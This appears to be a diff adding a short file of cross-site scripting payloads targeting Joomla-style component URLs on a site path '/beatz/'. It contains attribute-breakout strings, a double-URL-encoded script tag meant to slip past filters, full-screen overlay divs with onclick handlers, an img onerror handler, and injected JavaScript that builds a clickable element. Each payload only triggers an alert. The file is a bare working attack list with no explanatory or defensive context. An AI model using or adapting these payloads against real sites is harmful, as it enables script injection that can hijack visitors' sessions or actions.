@@ -1,0 +1,13 @@
+/beatz/?option=com_content&view=frontpage&limitstart=5&%2522%253e%253c%2573%2563%2572%2569%2570%2574%253e%2561%256c%2565%2572%2574%2528%252f%2578%2573%2573%252f%2529%253c%2f%2573%2563%2572%2569%2570%2574%253e=1 
+/beatz/index.php?option=com_charts&view=charts&Itemid=76&chartkeyword=Acoustic&do=all%22%20style%3dbackground-image:url('javascript:alert(/xss/)');width:100vw;height:100vh;display:block;"%20x=%22&option=com_charts
+/beatz/index.php?do=listAll&keyword=++Search";><img+src=0+onerror=alert(/XSS/)+data-xss="xss">&option=com_find
+/beatz/index.php?option=com_videos&view=videos&Itemid=59&video_keyword="+style="width:100vw;height:100vh;position:absolute;left:0;top:0"+data-xss="xss"+onclick="alert('xss')&search=Search
+
+
+%2522%253E%253C%2564%2569%2576%252B%2573%2574%2579%256C%2565%253D%2522%2577%2569%2564%2574%2568%253A%2531%2530%2530%2576%2577%253B%2568%2565%2569%2567%2568%2574%253A%2531%2530%2530%2576%2568%253B%2570%256F%2573%2569%2574%2569%256F%256E%253A%2561%2562%2573%256F%256C%2575%2574%2565%253B%256C%2565%2566%2574%253A%2530%253B%2574%256F%2570%253A%2530%2522%252B%2564%2561%2574%2561%252D%2578%2573%2573%253D%2522%2578%2573%2573%2522%252B%256F%256E%2563%256C%2569%2563%256B%253D%2522%2561%256C%2565%2572%2574%2528%2527%2578%2573%2573%2527%2529%2522%253E%253C%252F%2564%2569%2576%253E
+"><div+style="width:100vw;height:100vh;position:absolute;left:0;top:0"+data-xss="xss"+onclick="alert('xss')"></div>
+
+
+
+"><script>window.newItem=document.createElement("div");window.newItem.setAttribute("onclick","alert('xss')");
+window.newItem.setAttribute("data-xss","xss");window.newItem.innerHTML="Test";document.body.insertBefore(window.newItem,document.body.childNodes[0]);</script>
